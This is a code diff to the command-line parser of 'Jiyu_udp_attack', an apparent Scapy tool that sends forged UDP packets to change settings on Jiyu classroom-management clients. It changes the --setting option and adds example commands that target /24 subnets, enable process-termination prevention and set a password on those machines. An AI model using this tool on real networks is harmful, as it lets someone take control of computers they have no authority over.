@@ -11,6 +11,7 @@ The script uses Scapy for packet manipulation and sending.
 
 import argparse
 import binascii
+import shlex
 
 from typing import Any, List, Sequence, cast
 
@@ -63,7 +64,8 @@ def main_parser():
         '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
         '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
         '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
-        "    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n",
+        "    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n"
+        "    python Jiyu_udp_attack -t 127.0.0.1 --setting",
         formatter_class=MaxWidthHelpFormatter,
     )
     network_config_group = parser.add_argument_group(
@@ -184,10 +186,10 @@ def main_parser():
     )
     attack_action.add_argument(
         "--setting",
-        nargs="*",
+        nargs="?",
         metavar="<setting-args>",
-        help="Set specific settings on the target machine\n"
-        'Use `Jiyu_udp_attack -t 127.0.0.1 --setting="-h"` for help',
+        const="--help",
+        help="Set specific settings on the target machine\nUse `Jiyu_udp_attack -t 127.0.0.1 --setting` for help",
     )
     attack_action.add_argument(
         "--hex",
@@ -213,6 +215,11 @@ def setting_parser():
         description="Specify settings for the target machine",
         usage='Jiyu_udp_attack <main-args> --setting="[setting-options]"',
         argument_default=argparse.SUPPRESS,
+        epilog="Example usage:\n"
+        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting=""\n'
+        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--preventing-process-termination enable"\n'
+        '    python Jiyu_udp_attack -t 192.168.233.0/24 --setting="--password --password-value 123456"',
+        formatter_class=MaxWidthHelpFormatter,
     )
     network = parser.add_argument_group("Network Configuration")
     network.add_argument(
@@ -290,7 +297,6 @@ def setting_parser():
     other.add_argument(
         "--preventing-process-termination",
         type=str,
-        metavar="<mode>",
         choices=("disable", "enable", "auto"),
         default="auto",
         help="Set the process termination prevention mode (default: auto)",
@@ -298,7 +304,6 @@ def setting_parser():
     other.add_argument(
         "--lock-screen-when-maliciously-offline",
         type=str,
-        metavar="<mode>",
         choices=("disable", "enable", "auto"),
         default="auto",
         help="Set the lock screen mode when maliciously offline (default: auto)",
@@ -306,7 +311,6 @@ def setting_parser():
     other.add_argument(
         "--hide-the-setup-name-button",
         type=str,
-        metavar="<mode>",
         choices=("disable", "enable", "auto"),
         default="auto",
         help="Set the visibility of the setup name button (default: auto)",
@@ -381,7 +385,7 @@ if __name__ == "__main__":
             payload = pkg_rename(name, int(name_id))
         elif args.setting is not None:
             parser2 = setting_parser()
-            setting_args = parser2.parse_args(args.setting)
+            setting_args = parser2.parse_args(shlex.split(args.setting))
             payload = pkg_setting(**dict(setting_args._get_kwargs()))
             logger.append(setting_args)  # Store parsed settings for debugging
         elif args.hex:
